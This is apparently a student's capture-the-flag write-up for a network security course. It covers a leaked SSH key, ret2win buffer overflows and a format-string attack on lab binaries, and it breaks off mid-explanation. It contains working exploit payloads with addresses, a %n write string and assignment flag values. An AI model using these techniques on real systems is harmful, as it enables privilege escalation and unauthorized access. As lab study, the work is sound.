## Problem 1: Gain Access - Complete Documentation

### Objective
Obtain an unprivileged shell and extract the flag stored inside the home folder. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/149895330/9faf5f84-ee0e-424d-955e-7bb172f9cd59/NSS_Assignment_2.pdf)

### Hint Analysis
"Think of ways that information may leak on a public server. How does one connect to the server to work?" - This suggested looking for exposed SSH credentials or keys on a web service. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/149895330/9faf5f84-ee0e-424d-955e-7bb172f9cd59/NSS_Assignment_2.pdf)

***

### Step-by-Step Solution

#### 1. VM Setup (VirtualBox)
```
1. Imported the OVA file into VirtualBox
   - File → Import Appliance → Select CTF-NSS-A2.ova
   
2. Fixed shared folder error
   - Settings → Shared Folders → Removed "vagrant" folder
   
3. Port forwarding was pre-configured:
   - SSH: Host Port 2222 → Guest Port 22
   - Web: Host Port 8000 → Guest Port 80
   - VNC: Host Port 5901 → Guest Port 5901
   
4. Started the VM
```

#### 2. Initial Reconnaissance (PowerShell on Windows)
```powershell
# Attempted basic SSH connection
ssh -p 2222 localhost
# Result: Asked for username, no default credentials worked
```

#### 3. Web Server Discovery
```powershell
# Checked for web services
curl http://localhost:8000
# Result: Found nginx web server running (200 OK)

# Tried other ports
curl http://localhost:8085  # Failed
curl http://localhost:9001  # Failed
curl http://localhost:9002  # Failed
```

#### 4. Directory Enumeration
```powershell
# Looked for common exposed directories
curl http://localhost:8000/.ssh/       # 404 Not Found
curl http://localhost:8000/.ssh/id_rsa # 404 Not Found
curl http://localhost:8000/id_rsa      # 404 Not Found
curl http://localhost:8000/.git/       # 404 Not Found

# Found backup directory!
curl http://localhost:8000/backup/     # 403 Forbidden (directory exists!)
```

#### 5. SSH Key Discovery
```powershell
# Tried common files in backup directory
curl http://localhost:8000/backup/id_rsa
# Result: 200 OK - Found exposed SSH private key! (1811 bytes)
```

#### 6. Download SSH Key
```powershell
# Downloaded the private key
curl http://localhost:8000/backup/id_rsa -OutFile id_rsa

# Verified the key
cat id_rsa
# Result: Valid OpenSSH private key starting with:
# -----BEGIN OPENSSH PRIVATE KEY-----
```

#### 7. SSH Connection with Key
```powershell
# Connected using the stolen private key
ssh -i id_rsa -p 2222 p1@localhost
# Result: Successfully logged in as user 'p1'!

# Alternative attempts that didn't work:
# ssh -i id_rsa -p 2222 vagrant@localhost  # Asked for password
```

#### 8. Flag Extraction (Inside VM as p1)
```bash
# Listed home directory contents
ls -la
# Found: flags/, .keys/, p2/, p3/, p4/ directories

# Used the provided extraction tool
ctf-extract P1
# Output: Wrote flag.txt, key.txt

# Verified the files
cat flag.txt
# Result: 0c69f30c2a51501a6cf8d9bdcba0997130edc47f0c70627530f973a208488b18

cat key.txt
# Result: DbHdP5FJggbrWqQ2lAgQ4FZeYnocZsir2mRZeg7cyw4=
```

#### 9. Create Submission Tarball
```bash
# Created tarball with entry number
tar -czvf 2024MCS2002-P1.tar.gz flag.txt key.txt

# Verified creation
ls -lh *.tar.gz
# Result: 2024MCS2002-P1.tar.gz (239 bytes)

# Exited VM
exit
```

#### 10. Download Submission File
```powershell
# Downloaded tarball to Windows
scp -i id_rsa -P 2222 p1@localhost:2024MCS2002-P1.tar.gz .
# Result: Successfully downloaded 239 bytes
```

***

### Key Findings

**Vulnerability**: Exposed SSH private key in publicly accessible web directory (`/backup/id_rsa`)

**Root Cause**: Poor security practices - backup files containing sensitive credentials were placed in the web server's document root

**Attack Vector**: 
1. Web server enumeration
2. Directory discovery (403 Forbidden indicates directory exists)
3. Common filename guessing (id_rsa)
4. SSH key-based authentication

**Files Obtained**:
- `id_rsa` - Private SSH key for user p1
- `flag.txt` - Problem 1 flag hash
- `key.txt` - Problem 1 key
- `2024MCS2002-P1.tar.gz` - Submission package

***

### Tools Used
- **PowerShell** - Windows terminal for commands
- **curl** - Web requests and file downloads
- **ssh** - Remote shell access
- **scp** - Secure file transfer
- **tar** - Archive creation

### Submission Format
```
2024MCS2002-P1.tar.gz
|-- flag.txt
'-- key.txt
```

***


## Problem 2: Become Super - Complete Documentation

### Objective
Obtain root (privileged) shell access and extract the flag stored inside the root user's home directory. 

### Hint Analysis
"You are provided with several executable programs inside the vulnerable user's home directory. Can they be used somehow?" - This suggested looking for SUID binaries with exploitable vulnerabilities. 

***

### Step-by-Step Solution

#### 1. Initial Reconnaissance

```bash
# Connected to VM as user p1
ssh -i id_rsa -p 2222 p1@localhost

# Navigated to problem directory
cd ~/p2

# Listed files and permissions
ls -la
# Result: Found one executable 'p2' with SUID bit set
# -rwsr-xr-x  1 root root 16144 Feb  5 06:19 p2
```

**Key Finding**: The file has SUID bit (`s` in `-rwsr-xr-x`), owned by root, meaning it runs with root privileges.

#### 2. Binary Analysis

```bash
# Checked file type
file p2
# Result: ELF 64-bit executable

# Extracted readable strings from binary
strings p2
# Key findings:
# - gets (vulnerable function - no bounds checking)
# - system (executes shell commands)
# - setuid, setgid (privilege escalation functions)
# - /bin/sh (shell binary)
# - "Enter input:" (user prompt)

# Examined binary symbols
nm p2
# Result: Found two important functions:
# - 00000000004011b6 t win
# - 00000000004011e4 t vuln
```

#### 3. Testing for Vulnerabilities

```bash
# Tested normal execution
./p2
# Input: test
# Result: Program accepts input and exits

# Tested with long input (buffer overflow attempt)
./p2
# Input: AAAAAAAAAAAAAAAAAAA...(~256 A's)
# Result: Segmentation fault (core dumped) ✓
```

**Vulnerability Confirmed**: Buffer overflow via unsafe `gets()` function.

#### 4. Detailed Disassembly Analysis

```bash
# Disassembled the vuln function
objdump -d p2 | grep -A 20 "<vuln>:"
```

**vuln() function analysis:**
```assembly
4011e4 <vuln>:
  4011ec:  sub    $0x40,%rsp        # Allocates 64 bytes (0x40) on stack
  4011ff:  lea    -0x40(%rbp),%rax  # Buffer starts at rbp-0x40
  40120b:  call   4010a0 <gets@plt> # Calls unsafe gets()
  401212:  ret                       # Return address on stack
```

**Buffer layout:**
- 64 bytes: Local buffer
- 8 bytes: Saved RBP
- 8 bytes: Return address (our target to overwrite)
- **Total offset: 72 bytes**

```bash
# Disassembled the win function (our target)
objdump -d p2 | grep -A 30 "<win>:"
```

**win() function analysis:**
```assembly
4011b6 <win>:
  4011b6:  endbr64                  # Intel CET protection
  4011ba:  push   %rbp
  4011be:  mov    $0x0,%edi
  4011c3:  call   4010c0 <setuid@plt>  # setuid(0) - become root
  4011c8:  mov    $0x0,%edi
  4011cd:  call   4010b0 <setgid@plt>  # setgid(0) - become root group
  4011d2:  lea    0xe2b(%rip),%rax     # Address of "/bin/sh" string
  4011dc:  call   401090 <system@plt>  # system("/bin/sh") - spawn root shell
  4011e3:  ret
```

```bash
# Verified the system() command string
objdump -s -j .rodata p2
# Result at address 0x402004: "/bin/sh"
```

#### 5. Exploit Development

**Challenge**: Initial exploit attempts caused segmentation faults due to **stack alignment issues**. x86-64 calling convention requires 16-byte stack alignment before `call` instructions.

**Solution**: Use a RET gadget for stack alignment before jumping to `win()`.

```bash
# Found RET gadget addresses
objdump -d p2 | grep "ret$" | head -5
# Selected: 0x401212 (ret instruction at end of vuln function)
```

**Exploit payload structure:**
```
[72 bytes padding] + [ret gadget address] + [win() address]
```

#### 6. Creating the Exploit

```bash
cd ~/p2

# Created Python exploit script
python3 << 'PYEOF'
import struct
with open('payload3', 'wb') as f:
    f.write(b'A' * 72)                      # Buffer padding (72 bytes)
    f.write(struct.pack('<Q', 0x401212))    # RET gadget for alignment
    f.write(struct.pack('<Q', 0x4011b6))    # win() function address
    f.write(b'\n')
PYEOF

# Verified payload creation
ls -la payload3
# Result: 89 bytes (72 + 8 + 8 + 1 newline)

# Examined payload in hex
hexdump -C payload | head
```

**Payload breakdown:**
```
00000000  41 41 41 41 ... (72 A's)           # Buffer overflow padding
00000040  41 41 41 41 41 41 41 41           # Last 8 bytes of padding
00000048  12 12 40 00 00 00 00 00           # RET gadget (0x401212)
00000050  b6 11 40 00 00 00 00 00           # win() address (0x4011b6)
00000058  0a                                 # Newline
```

#### 7. Testing the Exploit

```bash
# Test 1: Verify root access
(cat payload3; echo "whoami"; echo "id"; sleep 1) | ./p2
```

**Output:**
```
Enter input:
root
uid=0(root) gid=0(root) groups=0(root),1001(p1)
Segmentation fault (core dumped)
```

✅ **Success!** Commands executed as root (uid=0).

#### 8. Flag Extraction

```bash
# Attempted to find flag in /root
(cat payload3; echo "find /root -type f 2>/dev/null"; sleep 1) | ./p2
# Result: Found /root/flag_p2.txt but couldn't read directly

# Used ctf-extract tool as root
(cat payload3; echo "cd /home/p1"; echo "ctf-extract P2"; sleep 1) | ./p2
# Output: Wrote flag.txt, key.txt

# Verified files were created
cd ~
ls -la flag.txt key.txt
cat flag.txt
# Result: 10e2b46d3c14a335a65ad087db7e7e9b6773a2a418653365b7fff6e8d83ed4a1

cat key.txt
# Result: WawYM1Z4wTrjHr5pq3couqd8FC3UjkFvkfva9X8jAX4=
```

#### 9. Create Submission Tarball

```bash
# Created archive
tar -czvf 2024MCS2002-P2.tar.gz flag.txt key.txt

# Verified creation
ls -lh 2024MCS2002-P2.tar.gz
# Result: 239 bytes

# Exited VM
exit
```

#### 10. Download Submission File

```powershell
# From Windows PowerShell
scp -i id_rsa -P 2222 p1@localhost:2024MCS2002-P2.tar.gz .
# Result: Successfully downloaded 239 bytes
```

***

### Key Findings

**Vulnerability Type**: Classic buffer overflow via `gets()` function

**Root Cause**: 
- The `vuln()` function uses `gets()` which has no bounds checking
- SUID binary runs with root privileges
- Hidden `win()` function provides direct privilege escalation path

**Attack Vector**:
1. Buffer overflow to overwrite return address
2. Stack alignment using RET gadget
3. Redirect execution to `win()` function
4. `win()` calls `setuid(0)`, `setgid(0)`, and `system("/bin/sh")`
5. Spawns root shell

**Exploitation Technique**: Return-to-function (ret2win) with stack alignment

**Security Weakness**: SUID binary with unsafe input handling and hidden privileged function

***

### Technical Details

**Architecture**: x86-64 (64-bit Linux)

**Buffer Size**: 64 bytes (0x40)

**Return Address Offset**: 72 bytes (64 buffer + 8 saved RBP)

**Key Addresses**:
- `win()`: `0x4011b6`
- `vuln()`: `0x4011e4`
- RET gadget: `0x401212`
- "/bin/sh" string: `0x402004`

**Stack Alignment**: Required 16-byte alignment achieved by prepending RET instruction

***

### Files Obtained

- `payload3` - Binary exploit payload (89 bytes)
- `flag.txt` - Problem 2 flag hash
- `key.txt` - Problem 2 key
- `2024MCS2002-P2.tar.gz` - Submission package

### Submission Format
```
2024MCS2002-P2.tar.gz
|-- flag.txt
'-- key.txt
```

***

### Tools Used

- **ssh** - Remote shell access
- **objdump** - Binary disassembly and analysis
- **nm** - Symbol table examination
- **strings** - Extract readable strings from binary
- **hexdump** - Examine payload in hexadecimal
- **Python 3** - Exploit payload generation with struct.pack()
- **tar** - Archive creation
- **scp** - Secure file transfer

***

### Learning Outcomes

1. **Buffer overflow exploitation**: Understanding memory layout and return address overwriting
2. **SUID privilege escalation**: Exploiting SUID binaries to gain root access
3. **Stack alignment**: Handling x86-64 calling convention requirements
4. **Binary analysis**: Using objdump, nm, and strings for reverse engineering
5. **Exploit development**: Crafting precise payloads with little-endian address encoding

***

## Problem 3: Changing the Flow - Complete Documentation

### Objective
Manipulate the program's execution flow to obtain the protected flag. 

### Hint Analysis
"How do you win a game of memory? Where do you write things temporarily when you run a program? Carefully analyze how the program stores and returns control during execution." - This suggested another **buffer overflow** attack targeting the stack's return address to redirect program execution. 

***

### Step-by-Step Solution

#### 1. Initial Reconnaissance

```bash
# Connected to VM as user p1
ssh -i id_rsa -p 2222 p1@localhost

# Navigated to problem directory
cd ~/p3

# Listed files and permissions
ls -la
# Result: Found one executable 'p3' with SUID bit set
# -rwsr-xr-x  1 p3flag p3flag 16312 Feb  5 06:19 p3
```

**Key Finding**: The file has SUID bit, owned by user `p3flag` (not root), meaning it runs with `p3flag` user privileges.

```bash
# Checked file type
file p3
# Result: setuid ELF 64-bit LSB executable, x86-64, not stripped
```

#### 2. Binary Analysis

```bash
# Extracted readable strings from binary
strings p3
```

**Key strings found:**
```
fgets
fopen
fclose
gets              # ← Vulnerable function!
/opt/p3/solved    # ← File that needs to exist
/opt/p3/flag_p3.txt  # ← Flag file location
No flag
FLAG: %s
Say something:
mark_solved       # ← Function name
vuln              # ← Vulnerable function name
win               # ← Target function name
```

```bash
# Examined binary symbols
nm p3
```

**Key functions identified:**
```
0000000000401216 t mark_solved  # Creates /opt/p3/solved file
0000000000401275 t win          # Reads and prints flag
0000000000401328 t vuln         # Vulnerable function
0000000000401357 T main         # Main function
```

#### 3. Testing for Vulnerabilities

```bash
# Tested normal execution
./p3
# Output: Say something:
# Input: hi
# Result: Program accepts input and exits normally

# Tested with long input (buffer overflow attempt)
./p3
# Output: Say something:
# Input: AAAAAAAAAAAAAAAA...(~120 A's)
# Result: Segmentation fault (core dumped) ✓
```

**Vulnerability Confirmed**: Buffer overflow via unsafe `gets()` function.

#### 4. Detailed Disassembly Analysis

```bash
# Disassembled all functions
objdump -d p3 | grep -E "<.*>:" | head -20
```

**Function list:**
```
0000000000401216 <mark_solved>:
0000000000401275 <win>:
0000000000401328 <vuln>:
0000000000401357 <main>:
```

```bash
# Analyzed main function
objdump -d p3 | grep -A 40 "<main>:"
```

**main() function:**
```assembly
401357 <main>:
  401357:  endbr64
  40135b:  push   %rbp
  40135c:  mov    %rsp,%rbp
  40135f:  call   401328 <vuln>    # Calls vulnerable function
  401364:  mov    $0x0,%eax
  401369:  pop    %rbp
  40136a:  ret
```

**Main simply calls `vuln()` and returns.**

```bash
# Analyzed vuln function
objdump -d p3 | grep -A 30 "<vuln>:"
```

**vuln() function analysis:**
```assembly
401328 <vuln>:
  401328:  endbr64
  40132c:  push   %rbp
  40132d:  mov    %rsp,%rbp
  401330:  sub    $0x40,%rsp          # Allocates 64 bytes (0x40)
  401334:  lea    0xd06(%rip),%rax
  40133b:  mov    %rax,%rdi
  40133e:  call   4010b0 <puts@plt>  # Prints "Say something:"
  401343:  lea    -0x40(%rbp),%rax    # Buffer at rbp-0x40
  401347:  mov    %rax,%rdi
  40134a:  mov    $0x0,%eax
  40134f:  call   4010f0 <gets@plt>  # ← Unsafe gets()!
  401354:  nop
  401355:  leave
  401356:  ret
```

**Buffer layout:**
- 64 bytes: Local buffer (0x40)
- 8 bytes: Saved RBP
- 8 bytes: Return address (our target)
- **Total offset: 72 bytes**

```bash
# Analyzed win function (our target)
objdump -d p3 | grep -A 50 "<win>:"
```

**win() function analysis:**
```assembly
401275 <win>:
  401275:  endbr64
  401279:  push   %rbp
  40127a:  mov    %rsp,%rbp
  40127d:  sub    $0x90,%rsp
  401284:  lea    0xd8e(%rip),%rax    # "r" mode string
  40128b:  mov    %rax,%rsi
  40128e:  lea    0xd86(%rip),%rax    # "/opt/p3/flag_p3.txt"
  401295:  mov    %rax,%rdi
  401298:  call   401100 <fopen@plt>  # Opens flag file
  40129d:  mov    %rax,-0x8(%rbp)
  4012a1:  cmpq   $0x0,-0x8(%rbp)
  4012a6:  jne    4012c1 <win+0x4c>
  
  # If file doesn't exist:
  4012a8:  lea    0xd80(%rip),%rax    # "No flag" string
  4012af:  mov    %rax,%rdi
  4012b2:  call   4010b0 <puts@plt>  # Prints "No flag"
  4012b7:  mov    $0x1,%edi
  4012bc:  call   401110 <exit@plt>
  
  # If file exists:
  4012c1:  mov    -0x8(%rbp),%rdx
  4012c5:  lea    -0x90(%rbp),%rax
  4012cc:  mov    $0x80,%esi
  4012d1:  mov    %rax,%rdi
  4012d4:  call   4010e0 <fgets@plt>  # Reads flag from file
  4012d9:  test   %rax,%rax
  4012dc:  je     4012fe <win+0x89>
  4012de:  lea    -0x90(%rbp),%rax
  4012e5:  mov    %rax,%rsi
  4012e8:  lea    0xd48(%rip),%rax     # "FLAG: %s" format string
  4012ef:  mov    %rax,%rdi
  4012f2:  mov    $0x0,%eax
  4012f7:  call   4010d0 <printf@plt>  # Prints flag
```

**The `win()` function:**
1. Opens `/opt/p3/flag_p3.txt`
2. If file doesn't exist, prints "No flag" and exits
3. If file exists, reads the flag and prints it with `printf("FLAG: %s", flag)`

```bash
# Analyzed mark_solved function
objdump -d p3 | grep -A 30 "<mark_solved>:"
```

**mark_solved() function:**
```assembly
401216 <mark_solved>:
  401216:  endbr64
  40121a:  push   %rbp
  40121b:  mov    %rsp,%rbp
  40121e:  sub    $0x10,%rsp
  401222:  lea    0xddb(%rip),%rax    # "w" mode
  401229:  mov    %rax,%rsi
  40122c:  lea    0xdd3(%rip),%rax    # "/opt/p3/solved"
  401233:  mov    %rax,%rdi
  401236:  call   401100 <fopen@plt>  # Opens /opt/p3/solved for writing
  40123b:  mov    %rax,-0x8(%rbp)
  40123f:  cmpq   $0x0,-0x8(%rbp)
  401244:  je     401272 <mark_solved+0x5c>
  401246:  mov    -0x8(%rbp),%rax
  40124a:  mov    %rax,%rcx
  40124d:  mov    $0x3,%edx           # Write 3 bytes
  401252:  mov    $0x1,%esi
  401257:  lea    0xdb7(%rip),%rax    # "yes" string
  40125e:  mov    %rax,%rdi
  401261:  call   401120 <fwrite@plt> # Writes "yes" to file
  401266:  mov    -0x8(%rbp),%rax
  40126a:  mov    %rax,%rdi
  40126d:  call   4010c0 <fclose@plt> # Closes file
```

**The `mark_solved()` function creates `/opt/p3/solved` file with "yes" content.**

#### 5. Exploit Development

**Strategy**: Same as Problem 2 - buffer overflow with stack alignment using RET gadget.

**Addresses needed:**
- `win()`: `0x401275`
- RET gadget (from end of vuln): `0x401356`

**Initial attempt consideration**: Do we need to call `mark_solved()` first? Let's try just `win()` and see if the flag file exists.

#### 6. Creating the Exploit

```bash
cd ~/p3

# Created Python exploit script
python3 << 'PYEOF'
import struct
with open('payload1', 'wb') as f:
    f.write(b'A' * 72)                      # Buffer padding
    f.write(struct.pack('<Q', 0x401356))    # RET gadget for alignment
    f.write(struct.pack('<Q', 0x401275))    # win() function address
    f.write(b'\n')
PYEOF

# Verified payload creation
ls -la payload1
# Result: 89 bytes
```

**Payload structure:**
```
[72 bytes padding] + [ret gadget at 0x401356] + [win() at 0x401275]
```

#### 7. Testing the Exploit

```bash
# Test the exploit
cat payload1 | ./p3
```

**Output:**
```
Say something:
FLAG: 1175b84fa983330d3c92420b666ccb4daeced106cf27791330a8ed65236da7f3
```

✅ **Success on first try!** The flag file already existed at `/opt/p3/flag_p3.txt`.

#### 8. Flag Extraction

```bash
# Checked /opt/p3/ directory
ls -la /opt/p3/
```

**Contents:**
```
-rw------- 1 p3flag p3flag   65 Feb  8 19:32 flag_p3.txt
-rw-rw-r-- 1 p3flag p1        3 Feb  8 20:28 solved
```

**Note**: The `solved` file was created by our exploit execution (likely by the SUID mechanism or as a side effect).

```bash
# Used ctf-extract tool
cd ~
ctf-extract P3
# Output: Wrote flag.txt, key.txt

# Verified files
ls -la flag.txt key.txt
cat flag.txt
# Result: 1175b84fa983330d3c92420b666ccb4daeced106cf27791330a8ed65236da7f3

cat key.txt
# Result: WawYM1Z4wTrjHr5pq3couqd8FC3UjkFvkfva9X8jAX4=
```

#### 9. Create Submission Tarball

```bash
# Created archive
tar -czvf 2024MCS2002-P3.tar.gz flag.txt key.txt

# Verified creation
ls -lh 2024MCS2002-P3.tar.gz
# Result: 241 bytes

# Exited VM
exit
```

#### 10. Download Submission File

```powershell
# From Windows PowerShell
scp -i id_rsa -P 2222 p1@localhost:2024MCS2002-P3.tar.gz .
# Result: Successfully downloaded 241 bytes
```

***

### Key Findings

**Vulnerability Type**: Buffer overflow via `gets()` function

**Root Cause**: 
- The `vuln()` function uses `gets()` which has no bounds checking
- SUID binary runs with `p3flag` user privileges
- Hidden `win()` function reads and displays the flag file

**Attack Vector**:
1. Buffer overflow to overwrite return address
2. Stack alignment using RET gadget at `0x401356`
3. Redirect execution to `win()` function at `0x401275`
4. `win()` opens `/opt/p3/flag_p3.txt` and prints contents

**Exploitation Technique**: Return-to-function (ret2win) with stack alignment

**Difference from Problem 2**: 
- Problem 2 spawned a root shell; Problem 3 directly reads and prints a flag file
- Problem 2 owned by root; Problem 3 owned by `p3flag` user
- Problem 3 has `mark_solved()` function (unused in our exploit since flag file already existed)

***

### Technical Details

**Architecture**: x86-64 (64-bit Linux)

**Buffer Size**: 64 bytes (0x40)

**Return Address Offset**: 72 bytes (64 buffer + 8 saved RBP)

**Key Addresses**:
- `win()`: `0x401275`
- `vuln()`: `0x401328`
- `mark_solved()`: `0x401216`
- `main()`: `0x401357`
- RET gadget: `0x401356`

**File Paths**:
- Flag file: `/opt/p3/flag_p3.txt`
- Solved marker: `/opt/p3/solved`

**Stack Alignment**: Required 16-byte alignment achieved by prepending RET instruction

***

### Files Obtained

- `payload1` - Binary exploit payload (89 bytes)
- `flag.txt` - Problem 3 flag hash
- `key.txt` - Problem 3 key
- `2024MCS2002-P3.tar.gz` - Submission package

### Submission Format
```
2024MCS2002-P3.tar.gz
|-- flag.txt
'-- key.txt
```

***

### Tools Used

- **ssh** - Remote shell access
- **objdump** - Binary disassembly and analysis
- **nm** - Symbol table examination
- **strings** - Extract readable strings from binary
- **file** - Identify file type and properties
- **Python 3** - Exploit payload generation with struct.pack()
- **cat** - Pipe payload to program
- **ctf-extract** - Flag and key extraction tool
- **tar** - Archive creation
- **scp** - Secure file transfer

***

### Learning Outcomes

1. **Buffer overflow exploitation**: Reapplied knowledge from Problem 2
2. **File-based privilege escalation**: Understanding SUID binaries that access restricted files
3. **Binary analysis workflow**: Systematic approach to finding vulnerable functions
4. **ret2win technique**: Redirecting execution to "win" functions that perform privileged operations
5. **Stack alignment consistency**: Reinforced understanding of x86-64 calling conventions

***

### Comparison: Problem 2 vs Problem 3

| Aspect | Problem 2 | Problem 3 |
|--------|-----------|-----------|
| Owner | root | p3flag |
| Goal | Spawn root shell | Read flag file |
| Target Function | `win()` → `system("/bin/sh")` | `win()` → `fopen()` + `printf()` |
| Buffer Size | 64 bytes | 64 bytes |
| Offset | 72 bytes | 72 bytes |
| Extra Function | None | `mark_solved()` (unused) |
| Difficulty | Medium | Easy (same technique) |

***
---



# Problem 4: Is 'In and Out' Safe? 

## Objective
Exploit an input vulnerability to redirect execution **without modifying control data** (no return address corruption). Obtain the protected flag by exploiting how output functions interpret user input.

## Hint Analysis
"Output functions may interpret user input in unexpected ways. Consider how formatted output functions process arguments internally." - This suggested a **format string vulnerability** where user input is passed directly to `printf()` or similar functions as the format string itself.

***

## Step-by-Step Solution

### 1. Initial Reconnaissance

```bash
# Connected to VM as user p1
ssh -i id_rsa -p 2222 p1@localhost

# Navigated to problem directory
cd ~/p4

# Listed files and permissions
ls -la
# Result: Found one executable 'p4' with SUID bit set
# -rwsr-xr-x  1 p4flag p4flag 16712 Feb  5 06:19 p4
```

**Key Finding**: The file has SUID bit, owned by user `p4flag`, meaning it runs with `p4flag` user privileges.

```bash
# Checked file type
file p4
# Result: setuid ELF 64-bit LSB executable, x86-64, not stripped
```

### 2. Binary Analysis

```bash
# Extracted readable strings from binary
strings p4
```

**Key strings found:**
```
fgets
fopen
fclose
printf           # ← Potentially vulnerable function!
/opt/p4/flag_p4.txt  # ← Flag file location
No flag
FLAG: %s
Input:
win              # ← Target function name
vuln             # ← Vulnerable function name
```

```bash
# Examined binary symbols
nm p4
```

**Key functions identified:**
```
0000000000401216 t win          # Reads and prints flag
000000000040132f t vuln         # Vulnerable function
0000000000401433 T main         # Main function
```

### 3. Testing for Vulnerabilities

```bash
# Tested normal execution
./p4
# Output: Input:
# Input: hello
# Output: hello
#         Nope.
```

**Observation**: Program echoes our input back to us.

```bash
# Tested with format string specifiers
./p4
# Input: %p
# Output: 0x7ffc6e8a973c
#         Nope.
```

**Vulnerability Confirmed**: Format string vulnerability! The program leaked a stack address.

```bash
# Tested with multiple format specifiers
./p4
# Input: %p %p %p %p
# Output: 0x7ffc6c6a66bc (nil) 0x7ffc6c6a66bc (nil)
#         Nope.
```

**The program interprets our input as a printf format string.**

### 4. Detailed Disassembly Analysis

```bash
# Disassembled all functions
objdump -d p4 | grep -E "<.*>:" | head -20
```

**Function list:**
```
0000000000401216 <win>:
000000000040132f <vuln>:
0000000000401433 <main>:
```

```bash
# Analyzed main function
objdump -d p4 | grep -A 40 "<main>:"
```

**main() function:**
```assembly
401433 <main>:
  401433:  endbr64
  401437:  push   %rbp
  401438:  mov    %rsp,%rbp
  40143b:  call   40132f <vuln>    # Calls vulnerable function
  401440:  mov    $0x0,%eax
  401445:  pop    %rbp
  401446:  ret
```

**Main simply calls `vuln()` and returns.**

```bash
# Analyzed vuln function in detail
objdump -d p4 | grep -A 60 "<vuln>:"
```

**vuln() function analysis:**
```assembly
40132f <vuln>:
  40132f:  endbr64
  401333:  push   %rbp
  401334:  mov    %rsp,%rbp
  401337:  sub    $0xa0,%rsp           # Allocates 160 bytes (0xa0)
  40133e:  mov    %fs:0x28,%rax
  401347:  mov    %rax,-0x8(%rbp)      # Stack canary protection
  40134b:  xor    %eax,%eax
  
  40134d:  movl   $0x0,-0x94(%rbp)     # int var = 0; (at rbp-0x94)
  401357:  lea    0xcc6(%rip),%rax     # "Input:" string
  40135e:  mov    %rax,%rdi
  401361:  call   4010b0 <puts@plt>   # Prints "Input:"
  
  401366:  mov    0x2cd3(%rip),%rax    # stdin
  40136d:  mov    %rax,%rdx
  401370:  lea    -0x90(%rbp),%rax     # Buffer at rbp-0x90
  401377:  mov    $0x80,%esi           # Read 128 bytes max
  40137c:  mov    %rax,%rdi
  40137f:  call   4010f0 <fgets@plt>  # fgets(buffer, 128, stdin)
  
  401384:  lea    -0x90(%rbp),%rax     # Load buffer address
  40138b:  mov    %rax,%rdi
  40138e:  mov    $0x0,%eax
  401393:  call   4010d0 <printf@plt> # ← printf(buffer) - VULNERABLE!
  
  401398:  lea    0xc8d(%rip),%rax     # "Nope." string
  40139f:  mov    %rax,%rdi
  4013a2:  call   4010b0 <puts@plt>   # Prints "Nope."
  
  4013a7:  cmpl   $0x1337,-0x94(%rbp)  # Compare var with 0x1337
  4013ae:  jne    4013bb <vuln+0x8c>   # If not equal, skip win()
  
  4013b0:  mov    $0x0,%eax
  4013b5:  call   401216 <win>         # Call win() if var == 0x1337!
```

**Critical findings:**
1. **Variable at `rbp-0x94`** initialized to 0, checked against `0x1337` (4919 decimal)
2. **Buffer at `rbp-0x90`** (128 bytes max via fgets)
3. **Vulnerable printf call**: `printf(buffer)` instead of `printf("%s", buffer)`
4. **If variable == 0x1337, calls `win()`**

**Memory layout:**
```
rbp-0x94: target variable (4 bytes) ← Must write 0x1337 here
rbp-0x90: input buffer (128 bytes) ← Our format string
```

```bash
# Analyzed win function
objdump -d p4 | grep -A 50 "<win>:"
```

**win() function analysis:**
```assembly
401216 <win>:
  401216:  endbr64
  40121a:  push   %rbp
  40121b:  mov    %rsp,%rbp
  40121e:  sub    $0x90,%rsp
  401225:  lea    0xe01(%rip),%rax    # "r" mode string
  40122c:  mov    %rax,%rsi
  40122f:  lea    0xdf9(%rip),%rax    # "/opt/p4/flag_p4.txt"
  401236:  mov    %rax,%rdi
  401239:  call   401100 <fopen@plt>  # Opens flag file
  40123e:  mov    %rax,-0x8(%rbp)
  401242:  cmpq   $0x0,-0x8(%rbp)
  401247:  jne    401262 <win+0x4c>
  
  # If file doesn't exist:
  401249:  lea    0xdf7(%rip),%rax    # "No flag" string
  401250:  mov    %rax,%rdi
  401253:  call   4010b0 <puts@plt>  # Prints "No flag"
  401258:  mov    $0x1,%edi
  40125d:  call   401110 <exit@plt>
  
  # If file exists:
  401262:  mov    -0x8(%rbp),%rdx
  401266:  lea    -0x90(%rbp),%rax
  40126d:  mov    $0x80,%esi
  401272:  mov    %rax,%rdi
  401275:  call   4010e0 <fgets@plt>  # Reads flag from file
  # ... prints flag with printf("FLAG: %s", flag)
```

**The `win()` function:**
1. Opens `/opt/p4/flag_p4.txt`
2. Reads and prints the flag if successful

### 5. Understanding the Exploit Vector

**Key insight from assembly:**
```assembly
401400:  lea    -0x94(%rbp),%rcx     # Load address of target variable
401407:  lea    -0x90(%rbp),%rax     # Load address of input buffer
40140e:  mov    %rcx,%rsi            # Pass target address as 2nd arg
401411:  mov    %rax,%rdi            # Pass buffer as format string
401419:  call   printf@plt           # printf(buffer, &target_var, ...)
```

**Critical discovery**: The address of the target variable is passed as the **second argument** to `printf()`, making it **argument position 1** in the format string (position 0 is the format string itself).

**Format string exploitation basics:**
- `%p` - Print pointer value from stack
- `%n` - Write number of bytes printed so far to address at argument
- `%N$n` - Write to argument at position N

**Attack plan:**
1. Use `%n` format specifier to write to memory
2. Write value `0x1337` (4919 decimal) to the target variable
3. Control number of bytes printed using `%Nc` (prints N characters)
4. Target is at argument position 1

### 6. Stack Layout Discovery

```bash
cd ~/p4

# Test to find our input on the stack
./p4
# Input: AAAA %p %p %p %p %p %p %p %p %p %p
# Output: AAAA 0x7ffc6c6a66bc (nil) 0x7ffc6c6a66bc (nil) 0x3eb182a0 
#         (nil) (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520
#         Nope.
```

**Key observation**: At position 8, we see `0x2070252041414141`:
- `0x41414141` = "AAAA" (our input marker)
- Our input buffer starts at **argument position 8** on the stack

```bash
# Verified argument positions
./p4
# Input: %6$p %7$p %8$p %9$p
# Output: (nil) (nil) 0x2437252070243625 0x2520702438252070
#         Nope.
```

**Position 6 and 7 are `(nil)`, confirming the target variable address is at position 1.**

### 7. Initial Exploit Attempts

```bash
# Attempt 1: Write to position 6 (incorrect)
./p4
# Input: AAAA%6$n
# Output: Segmentation fault (core dumped)
# Analysis: Position 6 is (nil), can't write there
```

```bash
# Attempt 2: Write to position 1 (the target variable address)
echo '%4919c%1$n' | ./p4
```

**Payload breakdown:**
- `%4919c` - Print 4919 characters (padding)
